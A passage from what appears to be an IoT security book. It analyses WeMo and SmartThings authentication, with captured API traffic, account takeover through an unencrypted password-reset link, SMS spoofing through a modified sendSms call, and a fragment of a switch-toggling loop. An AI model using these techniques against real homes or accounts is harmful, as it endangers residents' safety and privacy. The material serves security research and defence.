while True:
        off()
        time.sleep(5)
For a video demonstration of this, see my YouTube video on the subject.
Notice that no authentication or authorization token was required! We now have a clear
case in which similar thought processes in design were used to manufacture the WeMo
baby monitor as well as the WeMo Switch. As in the case with the baby monitor, it is
easy to see how malware authors can exploit the lack of security to quickly toggle the
power of WeMo switches around the world, should their malware successfully com‐
promise any desktop or laptop in a given home.
In addition to local access, the app can also enable remote access, so the Switch can be
toggled from anywhere in the world. To do this, the app first sends a request to the
remoteaccess1 service, similar to the case of the WeMo baby monitor. The app sends
a custom string as the DeviceName when invoking remoteaccess1 on the local web
server running on the switch. This value is echoed back to the app and stored by the
Switch as the authorization token.
When the user is remote, these values are sent to https://api.xbcs.net:8443/apis/
http/plugin/message, which is then relayed to the Switch. So, in essence, a potential
piece of malware needs only one-time access to the local WiFi network, after which the
malware author can capture these values and connect to the api.xbcs.net service di‐
rectly and issue a command to toggle the Switch.
In the case of Microsoft, ethical security researchers, as well as criminals, discovered
similarities in design across the product line to locate a vulnerability and to test if similar
insecure design principles were used elsewhere. In the case of the WeMo product line,
we can see how we have a similar situation. We’ve learned the hard way when it comes
96 
| 
Chapter 3: Assaulting the Radio Nurse: Breaching Baby Monitors and One Other Thing

to software and we have an example of the same issue reoccurring in the world of IoT
products.
Conclusion
Parents and guardians depend upon monitoring technology to protect the lives of their
loved ones. We noted several cases with Foscam devices that demonstrate how unnerv‐
ing it can be for a parent to realize that the monitoring device in the bedroom of their
infant has been compromised by an external entity. Having to run into a baby’s room
upon hearing a stranger’s voice is not an experience any parent would want to have. In
addition to scary situations like these, monitoring devices can be abused by malicious
entities to surreptitiously monitor conversations between adults remotely that can lead
to the loss of privacy.
In the case of the WeMo devices, it is clear that design principles led to a situation in
which the privacy of the monitoring device is at risk from anyone who might have one-
time access to the local network. Combine this situation with the Foscam devices, and
we can see how easy it is for anyone to find hundreds of thousands of expolitable IoT
monitoring devices using a service like Shodan.
We’ve learned security the hard way when it comes to software and we are at risk of
committing the same mistakes in IoT devices. We’ve learned not to trust other devices
on the local network. We’ve learned to have secure processes built into the development
lifecycle, so that bugs in code that lead to simple ways to bypass authentication don’t
occur. Companies building devices such as baby monitors must make it a habit to build
security in from the get-go, from designing secure use cases and architectures to making
sure the source code is checked for vulnerabilities.
Monitoring devices, especially such as the ones discussed in this chapter, must allow for
security patches to be applied seamlessly. Otherwise, we will only begin to add additional
devices in the millions onto the Internet that will remain unpatched and exploitable. In
the case of Foscam, the process to apply a critical security patch was so cumbersome
that few parents actually took the effort to do so. Consumers of such devices should
demand a smoother process by supporting manufacturers that implement software up‐
dates seamlessly.
Conclusion 
| 
97


CHAPTER 4
Blurred Lines: When the Physical Space
Meets the Virtual Space
Android and iOS are the most popular smartphone operating systems in the world. In
addition to many other uses, these phones are useful for their mapping functionality.
Prior to 2007, when the first iPhone was released, GPS functionality was barely usable.
Before the iPhone, most of us printed out directions on a sheet of paper using Yahoo!
Maps or MapQuest. It’s been only a few years since we began to rely so much on the
GPS abilities of our smartphones, yet it’s now hard to imagine how we got by in the past.
The tools we now have at home are likely to go through the same revolution. We are
rapidly headed toward replacing offline devices such as traditional door locks, radio
based baby monitors, and lighting with IoT platforms that allow the devices to serve us
wherever we are. In a few years, similar to our current sentiments on GPS on our
smartphones, we are going to wonder how we were able to get by without various things
(such as door sensors and motion detectors) in our homes being able to communicate
with us regardless of our location. The notion that we were once remotely unable to tell
if we left our home’s front door unlocked will seem unfathomable.
SmartThings (acquired by Samsung) is one company that is trying to lead the dream of
the IoT-connected home with their suite of products, such as the SmartSense Multi
Sensor and SmartPower Outlet. The SmartThings store has a slew of products that
individuals can buy and install themselves.
Given that SmartThings is so focused on enabling IoT in the home, this chapter focuses
on evaluating the security in the design of their products. It is important to identify
companies like SmartThings and analyze what good and bad design principles are at
work. People are installing and using such devices now, and the accompanying security
architecture is bound to set precedents and be leveraged in future versions of similar
products.
99

A lot of functionality of these products is also currently being used to ensure physical
security. For example, when the main door is unexpectedly opened at midnight, an alert
might be sent to the home owner on his or her smartphone. As such, it becomes an
emergency for us to strategize the current state of security of such products, so we can
learn how to secure them now and into the future.
The SmartThings system can also be used to control IoT products developed by third
parties. Many companies are trying to figure out how to interoperate with devices man‐
ufactured by others, so it is important to learn how to make all of our devices work with
each other securely. In this chapter, we will also take a look at the interoperability offered
by SmartThings from a security perspective.
SmartThings
In this section, we will focus on the following components: the SmartSense Multi Sensor,
the SmartThings app, and the SmartThings hub. Given the various methods the Smart‐
Things platform can be programmed using the app, our focus will be on testing the
secure design of the platform by analyzing the design and functionality of the app.
The SmartSense Multi Sensor (Figure 4-1) is a multi-purpose device that includes a
temperature sensor, an accelerometer, and a magnetic open/close sensor for doors. In
this chapter, we will focus on the use case of the SmartSense Multi Sensor being used to
trigger an event when a particular door is open or closed.
Figure 4-1. The SmartSense Multi Sensor
100 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

The SmartThings hub (Figure 4-2) is the brain of the SmartThings platform. It connects
to all the sensors (including some third-party devices), allowing the user to be notified
of events that trigger based on the inputs the sensors receive. The hub also connects to
the SmartThings cloud infrastructure, allowing you to program specific triggers when
the sensors receive input.
Figure 4-2. The SmartThings hub
The SmartThings hub uses the ZigBee protocol to communicate with
the nearby devices. The focus of this chapter is to evaluate security
design by analyzing the SmartThings app and the development envi‐
ronment. Please see Chapter 1 to learn how to capture and analyze
ZigBee data.
The SmartThings app can be used to configure the SmartThings devices and check their
status. In Figure 4-3, the app shows that the SmartPower outlet is toggled on and that
the door to which the SmartSense Multi Sensor is attached is closed.
SmartThings 
| 
101

Figure 4-3. The SmartThings iOS app
102 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

Users must register for a SmartThings account and sign in at the screen shown in
Figure 4-4.
SmartThings 
| 
103

Figure 4-4. SmartThings app login screen
104 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

When the user types in his or her credentials and presses"Log In, the app sends the
following POST request:
POST /oauth/token HTTP/1.1
Host: graph.api.smartthings.com
Accept: application/json
Proxy-Connection: keep-alive
X-ST-Client-DeviceModel: iPhone
X-ST-Api-Version: 2.1
Accept-Encoding: gzip, deflate
Accept-Language: en;q=1
X-ST-Client-AppVersion: 1.6.5
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Content-Length: 191
User-Agent: SmartThings/1006 (iPhone; iOS 8.0.2; Scale/2.00)
X-ST-Client-OS: iOS 8.0.2
Connection: keep-alive
client_id=[DELETED]&client_secret=[DELETED]0&grant_type=password&
password=skeuomorphism&scope=mobile&username=scott.forstall@apple.com
The app is using the OAuth standard to submit the credentials and gain authorization.
The client_id and client_secret values submitted by the app are always the same,
so they can be considered public information. As expected, the combination of the
username and password fields need to be correct. Once the user submits the right cre‐
dentials, the graph.api.smartthings.com will respond in the following way:
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: application/json
Date: Fri, 17 Oct 2014 04:46:45 GMT
Server: Apache-Coyote/1.1
Vary: Accept-Encoding
Content-Length: 135
Connection: keep-alive
{
  "access_token": "[DELETED]",
  "expires_in": 1576799999,
  "scope": "mobile",
  "token_type": "bearer"
}
The important token to note here is access_token, which the app will use to convince
the graph.api.smartthings.com server that it has authorization. Anyone who knows
this token can directly connect to the graph.api.smartthings.com server and imper‐
sonate the user. Note that the value of expires_in is the unit of seconds, which correlates
to 18,250 days. In other words, the access_token value is valid and will be accepted by
graph.api.smartthings.com for 18,250 days, after which the user will be required to
log in again.
SmartThings 
| 
105

The SmartThings App allows the user to specify multiple physical locations, such as
home and office, and manage devices within those locations. Figure 4-5 shows the app
interface listing a current location (Home) with the ability to add additional locations.
106 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

Figure 4-5. SmartThings App interface for viewing and adding locationsSmartThings 
| 
107

To get the list of locations associated with the user, the app sends the following request:
GET /api/locations HTTP/1.1
Host: graph.api.smartthings.com
Accept: application/json
Authorization: Bearer [DELETED]
Proxy-Connection: keep-alive
X-ST-Client-DeviceModel: iPhone
X-ST-Api-Version: 2.1
Accept-Encoding: gzip, deflate
Accept-Language: en;q=1
X-ST-Client-AppVersion: 1.6.5
X-ST-Api-Key: [DELETED]
X-ST-Client-OS: iOS 8.0.2
User-Agent: SmartThings/1006 (iPhone; iOS 8.0.2; Scale/2.00)
Connection: keep-alive
The X-ST-Api-Key token is constant and can be considered public knowledge. The value
submitted for Authorization is the access_token value that was received by the app
upon successful authentication. The graph.api.smartthings.com server responds
with the following:
HTTP/1.1 200 OK
Content-Type: application/json;charset=utf-8
Date: Fri, 17 Oct 2014 04:46:47 GMT
Server: Apache-Coyote/1.1
Vary: Accept-Encoding
X-Pad: avoid browser bug
Content-Length: 1204
Connection: keep-alive
[{"id":"[DELETED]","name":"Home","accountId":"[DELETED]","latitude":42.613706,
"longitude":-120.200028,"regionRadius":150,"backgroundImage":
"https://smartthings-location-images.s3.amazonaws.com/standard/standard62.jpg",
"mode":{"id":"[DELETED],"name":"Away","locationId":"[DELETED]"},"modes":
[{"id":"[DELETED]","name":"Away","locationId":"[DELETED]"},{"id":"
[DELETED]","name":"Home","locationId":"[DELETED]"},{"id":"[DELETED]","name":
"Night","locationId":"[DELETED]"}],"role":"owner","helloHomeAppId":"[DELETED]",
"temperatureScale":"F","hubs":[{"id":"[DELETED]","name":"Home","locationId":
"[DELETED]","firmwareVersion":"000.010.00246","zigbeeId":"[DELETED]","status":
"ACTIVE","onlineSince":"2014-10-08T18:42:52.679Z","signalStrength":null,
"batteryLevel":null,"type":{"name":"Hub"},"virtual":false,"role":"owner",
"firmwareUpdateAvailable":false}]}]
According to the response, the user has one location associated with his or her account.
This is identified by the value of the id token. The latitude and longitude values
represent the actual physical location. There are also several modes, such as Away and
Home. The user can manually set the current mode, or the SmartThings system can be
configured to do it automatically, such as setting the value to Away when the user’s phone
is outside of the regionRadius value of the location.
108 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

The SmartThings app now needs to pull additional information about the SmartThings
devices associated with the account and their configurations. It does this by issuing the
following POST request using the location id and access_token (for the Authoriza
tion field) obtained earlier:
GET /api/locations/[DELETED]/smartapps/ HTTP/1.1
Host: graph.api.smartthings.com
Accept: application/json
Authorization: Bearer [DELETED]
Proxy-Connection: keep-alive
X-ST-Client-DeviceModel: iPhone
X-ST-Api-Version: 2.1
Accept-Encoding: gzip, deflate
Accept-Language: en;q=1
X-ST-Client-AppVersion: 1.6.5
X-ST-Api-Key: [DELETED]
X-ST-Client-OS: iOS 8.0.2
User-Agent: SmartThings/1006 (iPhone; iOS 8.0.2; Scale/2.00)
Connection: keep-alive
And the server responds with the following:
HTTP/1.1 200 OK
Content-Type: application/json;charset=utf-8
Date: Fri, 17 Oct 2014 04:46:49 GMT
Server: Apache-Coyote/1.1
Vary: Accept-Encoding
X-Pad: avoid browser bug
Connection: keep-alive
Content-Length: 18488
[{"id":"[DELETED]","label":"Intruder alert","smartAppVersion":{"id":"[DELETED]"
,"version":0.9,"state":"SELF_APPROVED","name":"Smart Security","description":
"Alerts you when there are intruders but not when you just got up for a glass
of water in the middle of the night","iconUrl":"
https://s3.amazonaws.com/smartapp-icons/SafetyAndSecurity/App-IsItSafe.png",
"iconX2Url":
"https://s3.amazonaws.com/smartapp-icons/SafetyAndSecurity/App-IsItSafe@2x.png",
"dateCreated":"2013-05-29T11:58:02Z","lastUpdated":"2014-05-14T21:55:47Z",
"preferences":{"sections":[{"input":[{"title":[DELETED]],"hideable":false,
"hidden":false,"mobileOnly":true}],"defaults":true},"legacy":true,"pageCount":
0,"installedCount":1420,"author":"SmartThings","photoUrls":[],"videoUrls":[],
"showModuleWithoutChildren":false,"smartApp":{"id":"[DELETED]"}},
"installedSmartAppParentId":null,"settings":{"textMessage":"Intruder alert!",
"intrusionMotions":[],"alarms":[],"intrusionContacts":["[DELETED],"silent":
"Yes","newMode":"","residentMotions":[],"residentsQuietThreshold":"0","phone":
"4151111111","lights":[],"seconds":"0"}
Notice the Intruder alert customization, which sends an alert to the user’s phone
using a text message (to phone number 4151111111 in this case) every time someone
opens the main door (detected by an installed SmartThings Multi Sensor). Figure 4-6
shows the corresponding user interface on the app.
SmartThings 
| 
109

110 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

Figure 4-6. SmartThings App configuration for “Intruder alert” customization
SmartThings 
| 
111

Now that the customization is set, the SmartThings app will send a text message to
4151111111 every time the door is opened. Figure 4-7 shows the text message (“Intruder
alert!”) recieved by the user when the customization is triggered.
112 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

Figure 4-7. Text message alerting user when door is opened
SmartThings 
| 
113

It isn’t hard to imagine the amount of trust a family would have to place into a product
to depend on it to send an alert in case of a physical intrusion. As such, it is important
that products such as SmartThings architect security in the design and functionality of
their products. In the next few sections, we will look at scenarios that could put Smart‐
Things customers at risk and how the issues can be mitigated.
Hijacking Credentials
As we’ve seen, the SmartThings app stores the user’s settings and customizations on the
external infrastructure available at graph.api.smartthings.com. This makes it possible
for an external entity to take control over the user’s SmartThings devices if they are able
steal the password. Malicious entities that successfully do this can switch on or off ap‐
pliances connected to the SmartPower Outlet or disable customizations associated with
the SmartSense Multi Sensor.
As shown in Figure 4-8, app requires a password at least eight characters long, including
at least one number and one letter.
114 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

Figure 4-8. SmartThings app password requirements
SmartThings 
| 
115

Based on the complexity of the password requirments, SmartThings designers clearly
intend to build in security. Complex passwords slow down attackers, who try to guess
various combinations of possible passwords.
Should the user forget the password, he or she can request a new one can be requested,
as shown in Figure 4-9.
116 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

Figure 4-9. Password reset request using the SmartThings app
SmartThings 
| 
117

As soon as the user presses the Send Recovery Email button, the app sends the email
shown in Figure 4-10 to the user.
Figure 4-10. Email from SmartThings allowing the user to reset his or her password
The “click here to reset your password” link is in following form:
http://mandrillapp.com/track/click/30028387/graph.api.smartthings.com
?p=sdf9234msafd0234ASFASDf234023042342masdf0234SDAFSDF0234msdf0asfdsd
f02342msad
When the user clicks on this link, the browser is redirected to the SmartThings website
with a link such as this:
https://graph.api.smartthings.com/register/resetPassword?t=2304ksdf0As
dfa3sdfd4asfasdf
Upon redirection, the user is allowed to pick a new password, as shown in Figure 4-11.
Figure 4-11. User picking a new password as part of the password recovery process
118 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

There are several security issues with the SmartThings authentication and authorization
systems.
Single-factor authentication
Systems that protect against physical threats should not rely upon single-factor authen‐
tication. SmartThings markets its ability to secure and monitor the home as a primary
feature. Even though the system has implemented a complex password requirement, a
one-time access to the owner’s email account can compromise the physical security
promised by the system. It might be overkill to protect your Pizza Hut account with
anything more than a username and password, since the cost of implementing extra
measures might be higher than accepting the cost if nefarious pizza-ordering activity.
But a system you rely upon to protect your home and loved ones must offer greater
security.
In the current situation, a malicious entity can use the password reset feature
(Figure 4-9) to reset a victim’s SmartThings password. All the attacker needs is tempo‐
rary access to the target’s email account, which can be gained by stealing a mobile device
that belongs to the SmartThings user and capturing the resetted password (Figure 4-11)
just by using the user’s preconfigured email client on the mobile device. This requires
physical access to the mobile device, so it is less probable, but the attacker could also
obtain access to the email account by launching a phishing attack or successfully in‐
fecting the victim with malware that captures email credentials.
The point here is that products that advertise physical security should take security
seriously and implement tighter controls. Millions of people routinely have their email
credentials compromised on a weekly basis. Users should not have to worry about an
intruder remotely being able to monitor their home and influence the devices in their
home just because they fell victim to a simple phishing attack.
Companies such as Google and Apple have realized that it is becoming harder to guar‐
antee customer security by relying on a username and password mechanism alone.
Google offers two-factor authentication, which requires the use of a password (first
factor) in addition to the possession of a mobile device (second factor).
With two-factor authentication enabled, the user must first enter his or her credentials,
after which a randomly generated code is sent as a text message to the user’s phone. The
user must also enter this code to log into the account. This type of setup requires knowl‐
edge of something secret (password), along the possession of a physical object (mobile
device).
Apple has implemented a similar method to protect their users and has also opened its
TouchID system to third-party app developers. This could easily be leveraged by the
SmartThings app to verify the user’s fingerprint as the second factor.
SmartThings 
| 
119

Another issue of concern is the longevity (18,250 days!) of the access_token discussed
earlier. Since 18,250 days equals approximately 50 years, a potential attacker has five
decades to try to obtain the access_token and reuse it to launch commands using the
graph.api.smartthings.com service.
We hope that SmartThings and other emerging IoT manufacturers will enhance their
designs to implement two-factor authentication, so that attackers won’t be able to dis‐
rupt physical safety using traditional attack vectors such as phishing and infecting
desktops with malware.
Clear-text password reset link
The clear-text password reset link sent by the SmartThings app can be abused to hijack
the user’s credentials. As shown in Figure 4-10, the user is sent a password recovery
email when the user requests to reset his or her password (Figure 4-9). This link (in the
form 
of 
http://mandrillapp.com/track/click/30028387/graph.api.smart
things.com, as discussed earlier) does not use Transport Layer Security (TLS), but is
rather sent across the local network and the Internet in the clear.
The user is then redirected to a link that does use TLS (in the form of https://
graph.api.smartthings.com/register/resetPassword, also dicussed earlier). How‐
ever, anyone on the local WiFi network, such as a public wireless network in a cafe, can
capture the original link if the user were to click on it. Once this link has been captured,
the attacker can reset the password by submitting a new password before the victim
does. Once the password is reset, the password reset link expires and the user will have
to submit a new request.
In this case, an argument could be made that it is hard for a potential attacker to wait
around for the victim to forget his or her password and submit a reset request at a cafe.
However, in the case of a targeted attack in which the attacker is on the same wireless
network as the victim, the attacker can initiate the password reset by submitting the
request shown in Figure 4-9 on behalf of the user. In that case, the victim would likely
be surprised by the password reset email.
But it is also likely for the victim to assume there is a glitch in the SmartThings system
and go ahead with the reset process anyway, allowing the attacker to capture the initial
link and take over the account. In addition to this scenario, individuals with access to
the network devices between the victim and mandrillapp.com can also capture the
initial link and compromise the user’s SmartThings account.
Abusing the Physical Graph
The upcoming age of IoT is bound to connect our physical world with our online virtual
spaces. We have already witnessed this occur throughout the previous chapters of this
book: being able to control lightbulbs based on triggers on Facebook using IFTTT,
120 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

sending our companions electronic keys using our mobile devices that can be used to
open physical doors, and storing information about our physical IoT objects on remote
servers like graph.api.smartthings.com.
The SmartThings team has published a vision of their notion of a Physical Graph that
will serve as a platform for IoT objects in the future:
At SmartThings, we believe the next and perhaps most life-altering evolution of the In‐
ternet will be the creation of the physical graph; the digitization, connectivity and pro‐
grammability of the physical world around us. Whether you call this the Internet of
Things, sensor networks or home and life automation, the implications for how we live,
work, and have fun are profound. At our core, we also believe that for the ecosystem to
be healthy, it must be open. An open physical graph is the only way to bridge the inno‐
vation, inventions and brilliance of the many device manufacturers, hardware makers,
developers, and everyday people who are working to change our lives today and in the
future.
SmartThings has brought their vision of “connectivity and programmability of the
physical world” to life using their web-based integrated development environment
(IDE). Using this free tool, users can easily program their IoT devices to perform tasks
tailored to their personal specifications.
Anyone can sign up for a free SmartThings developer account and start using the IDE
to create programs to control IoT devices. As shown in Figure 4-12, developers can
quickly start building programs by selecting from a variety of Example SmartApps.
SmartThings 
| 
121

Figure 4-12. The SmartThings IDE
It is great that the SmartThings team has decided to open up a free tool to its users and
developers, but from a security perspective, it becomes important to make sure the
platform cannot be abused by malicious entities. For example, take a look at the Text
Me When It Opens program available from the Example SmartApps library:
/**
 *  Text Me When It Opens
 *
 *  Author: SmartThings
 */
definition(
    name: "Text Me When It Opens",
    namespace: "smartthings",
    author: "SmartThings",
    description: "Get a text message sent to your phone when an open/close sensor
    is opened.",
    category: "Convenience",
    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Meta/window_contact.png",
    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Meta/
    window_contact@2x.png"
)
preferences {
    section("When the door opens...") {
                input "contact1", "capability.contactSensor", title: "Where?"
        }
122 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

        section("Text me at...") {
                input "phone1", "phone", title: "Phone number?"
        }
}
def installed()
{
        subscribe(contact1, "contact.open", contactOpenHandler)
}
def updated()
{
        unsubscribe()
        subscribe(contact1, "contact.open", contactOpenHandler)
}
def contactOpenHandler(evt) {
        log.trace "$evt.value: $evt, $settings"
        log.debug "$contact1 was opened, texting $phone1"
        sendSms(phone1, "Your ${contact1.label ?: contact1.name} was opened")
}
This program sets up a virtual contact (emulating the SmartSense Multi Sensor) that
can be toggled using the IDE. Once this contact is toggled to the Open state, the code
in contactOpenHandler(evt) is invoked, which in turn invokes sendSms service to send
a text message.
Take a look at Figure 4-7 again. Notice that the SmartThings service uses a short code
(same as phone numbers, but specific to text messages) of 512-69. If anyone in the world
(even those who don’t own a single SmartThings product) were to sign up for a free
SmartThings IDE and use the Text Me When It Opens program, they could use this
testing functionality to send any text message to anyone in the world and it will also
appear from the short-code 512-69.
Now imagine if someone were to change the sendSms code to the following:
sendSms(phone1, "WARNING: Systems malfunction. All devices disarmed.
Possible intruder activity.")
In this case (Figure 4-13), the user will get a text message with the scary warning from
the same 512-69 short code. Imagine getting such a text message past midnight, while
you are sleeping or perhaps even away from home. Users that have gotten previous text
messages from the SmartThings system are likely to trust the message, because it orig‐
inates from the same short code. In fact, when the short code used by SmartThings
recently changed (to 512-69), users inquired on discussion forums, indicating that they
are indeed aware and trust messages that originate from the code.
SmartThings 
| 
123

Figure 4-13. Scary text message to SmartThings user
124 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

Many users might choose to use push notifications such as Apple Push Notification and
Google Cloud Messaging services to send the notifications instead of text. However,
others prefer text messages, especially when SmartThings needs to shut down non-text-
based notifications for maintenance, as shown in an actual announcement in
Figure 4-14. In fact, the announcement from SmartThings advises users to select to
receive text messages instead of push notifications, making such intervals the perfect
time for intruders to abuse the situation.
Figure 4-14. Email from SmartThings advising users of maintainance schedule
This is just one example of how such a system can be abused. A malicious person who
knows of your cell phone number and knows that you rely on SmartThings products
to remotely ensure the safety of your family could abuse this situation to cause you to
leave a particular location (such as your office) and head home to check up on your
family because you received a SMS from the SmartThings short code.
In addition, spammers can abuse the free sendSms functionality to use the SmartThings
short code to send free text advertisements to anyone.
SmartThings 
| 
125

The lesson here is that the incoming number associated with text messaging should
never be used to establish trust or prove authenticity. One solution is to request the user
to input a four-digit number that will be reflected on every text message sent out by
SmartThings. Users can be educated to disregard messages that do not contain the four-
digit prefix. However, this creates greater burden on the users and hinders the experience
of the product. Still, this is the price to pay if traditional protocols such as text messaging
are to be used.
Data-driven push notifications are much more reliable, because they rely on certificate-
based encryption and authentication and are much harder to spoof.
SmartThings SSL Certificate Validation Vulnerability
In March 2015, a report titled SmartThings SSL Certificate Validation Vulnerability
exposed a critical issue relating to the SmartThings hub:
The communications between the SmartThings Hub and the SmartThings backend
servers is encrypted with SSL. However, the SSL client implementation in use does not
validate the authenticity of the SSL certificate presented by the server during the initial
handshake. An attacker with the ability to monitor and intercept traffic can present a
“forged” SSL certificate to the Hub claiming to be a legitimate backend server, which the
Hub will accept as genuine. This makes it possible to perform a “man-in-the-middle”
attack, whereby an attacker relays communications between client and server without
their knowledge. In this scenario, the communications are available to the attacker in an
unencrypted form and may be modified or disrupted, effectively defeating the protections
offered by SSL encryption.
Secure and authenticated communications are vital to a platform such as SmartThings,
which may be used as part of a home security system. As an example, the Hub transmits
a data packet when a SmartSense Open/Closed Sensor opens. By simply not relaying this
data packet, an attacker can prevent notification of this event from ever reaching the
SmartThings backend servers, which in turn prevents notification being delivered to the
end user.
A potential mitigating factor is the lack of WiFi communication used by the Hub, making
traffic interception more difficult as it requires that an attacker be physically connected
to the same network as the Hub or for interception to occur during transit over the
Internet. However this does not offer complete protection, as several home networks
make use of WiFi bridges or repeaters. An attacker may also have compromised another
device residing on the network such as a router or personal media server that may be
used to perform traffic interception.
Security vulnerabilities such as this can allow an attacker on the same WiFi network (or
on a device that is between the home network of the user and the route to the Smart‐
Things network) to modify and influence all of the communication between the hub
and the SmartThings network. Attackers can abuse this vulnerability to trigger or deny
alerts that the user might have set up, and this can put the physical safety of SmartThings
customers at risk.
126 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

The good news is that the SmartThings team worked with the researchers and responded
with a security patch:
11/10/14 - Initial report to vendor
11/11/14 - Report acknowledged
11/21/14 - Vulnerability confirmed
01/29/15 - Updated firmware rollout begins
03/04/15 - Public disclosure
The researchers of this vulnerability should also be given credit for having patience to
work with SmartThings and waiting for the patch to be rolled out before explosing the
issue.
This is a good example of how a security issue in an IoT product can give rise to vul‐
nerabilities that attackers can abuse to formulate man-in-the-middle attacks. However,
this is also a great example of how IoT vendors, such as SmartThings, should work with
security researchers to understand the issue and roll out firmware patches to protect
their customers.
Interoperability with Insecurity Leads to … Insecurity
We have to give credit where credit is due. The SmartThings suite of products should
shore up its authentication capabilities and be cognizant about securely enabling tra‐
ditional services such as text messaging with their free developer suite. That said, unlike
the Philips hue or Belkin WeMo products, the SmartThings architecture does not im‐
plicitly trust the local network.
In the case of the Belkin WeMo baby monitor and the WeMo switch, any device on the
same local network can readily connect and instruct the devices without the use of any
further authentication. However, in the case of SmartThings, the hub and the app con‐
nect outbound to graph.api.smartthings.com to communicate with each other. In
this way, every update and instruction is validated against an established and authen‐
ticated session tied to the user’s SmartThings account. This makes SmartThings’ ap‐
proach more secure, because it doesn’t allow a workstation infected with malware to
directly manipulate SmartThings devices.
In addition to SmartThings’ own devices, the system now supports interoperability with
third-party IoT devices. With SmartThings Labs, the SmartThings App and hub can be
used to control the Philips hue lighting system, the WeMo switch, and other devices.
Having given credit to SmartThings for securely routing information through
graph.api.smartthings.com and not trusting the local network implicitly, we will an‐
alyze weather this secure design principle holds up, by looking at how SmartThings
interoperates with the Philips and Belkin products.
Interoperability with Insecurity Leads to … Insecurity 
| 
127

SmartThings and hue Lighting
Using the SmartThings App, it is possible to search for and connect to the Philips hue
bridge (described in Chapter 1). In order to do this, touch the + button at the bottom
of the Dashboard section of the SmartThings App. Next, select Light Bulbs → Philips
hue Light Bulb. Once you do this, your screen should look like Figure 4-15.
128 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

Figure 4-15. SmartThings App connecting to a Philips Hue bridge
Interoperability with Insecurity Leads to … Insecurity 
| 
129

The SmartThings hub starts to look for a hue bridge on the local network by issuing the
following SSDP query:
M-SEARCH * HTTP/1.1
MX: 1
MAN: "ssdp:discover"
HOST:239.255.255.250:1900
ST: urn:schemas-upnp-org:device:basic:1
The hue bridge responds to this query and identifies itself:
HTTP/1.1 200 OK
CACHE-CONTROL: max-age=100
EXT:
LOCATION: http://10.0.1.2:80/description.xml
SERVER: FreeRTOS/6.0.5, UPnP/1.0, IpBridge/0.1
ST: upnp:rootdevice
The SmartThings hub now fetches /description.xml from the hue bridge by issuing the
following GET request:
GET /description.xml HTTP/1.1
Accept: */*
User-Agent: Linux UPnP/1.0 SmartThings
HOST: 192.168.2.2:80
To which the hue bridge responds:
HTTP/1.1 200 OK
Content-type: text/xml
Connection: Keep-Alive
<?xml version="1.0" encoding="UTF-8" ?>
<root xmlns="urn:schemas-upnp-org:device-1-0">
<specVersion>
<major>1</major>
<minor>0</minor>
</specVersion>
<URLBase>http://10.0.1.2:80/</URLBase>
<device>
<deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
<friendlyName>Philips hue (10.0.1.2)</friendlyName>
<manufacturer>Royal Philips Electronics</manufacturer>
<manufacturerURL>http://www.philips.com</manufacturerURL>
<modelDescription>Philips hue Personal Wireless Lighting</modelDescription>
<modelName>Philips hue bridge 2012</modelName>
<modelNumber>929000226503</modelNumber>
<modelURL>http://www.meethue.com</modelURL>
<serialNumber>[DELETED]</serialNumber>
<presentationURL>index.html</presentationURL>
<iconList>
<icon>
<mimetype>image/png</mimetype>
<height>48</height>
130 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

<width>48</width>
<depth>24</depth>
<url>hue_logo_0.png</url>
</icon>
<icon>
<mimetype>image/png</mimetype>
<height>120</height>
<width>120</width>
<depth>24</depth>
<url>hue_logo_3.png</url>
</icon>
</iconList>
</device>
</root>
At this point, the user will see a notification that the bridge has been found, as shown
in Figure 4-16.
Interoperability with Insecurity Leads to … Insecurity 
| 
131

Figure 4-16. SmartThings app locateing the hue bridge
132 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

When the Next button is pressed, the SmartThings hub sends the following POST to the
hue bridge:
POST /api HTTP/1.1
Accept: */*
User-Agent: Linux UPnP/1.0 SmartThings
HOST: 10.0.1.2:80
Content-Type: application/json
Content-Length: 107
{"devicetype":"8f7ab27c-6c04-4378-b0b1-dcd4fd468815-0","username":"8f7ab27c-6c04
-4378-b0b1-dcd4fd468815-0"}
The values for devicetype and username are the same and seem random enough in
nature. Recall (from “Controlling Lights Using the iOS App” on page 18) that the user
will have to prove physical ownership of the bridge by pressing the button on it within
30 seconds. When this happens, the hue bridge will accept the value of username and it
can subsequently be used by the SmartThings hub to connect to the hue bridge on the
local network and issue commands.
Assuming the user presses the button on the hue bridge, the following response is re‐
turned to the SmartThings hub:
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Expires: Mon, 1 Aug 2011 09:00:00 GMT
Connection: close
Access-Control-Max-Age: 3600
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE, HEAD
Access-Control-Allow-Headers: Content-Type
Content-type: application/json
[{"success":{"username":"8f7ab27c-6c04-4378-b0b1-dcd4fd468815-0}}]
The user will be notified that the connection was sucessful, as shown in Figure 4-17.
Interoperability with Insecurity Leads to … Insecurity 
| 
133

Figure 4-17. SmartThings hub successfully gaining authorization from the hue bridge
134 
| 
Chapter 4: Blurred Lines: When the Physical Space Meets the Virtual Space

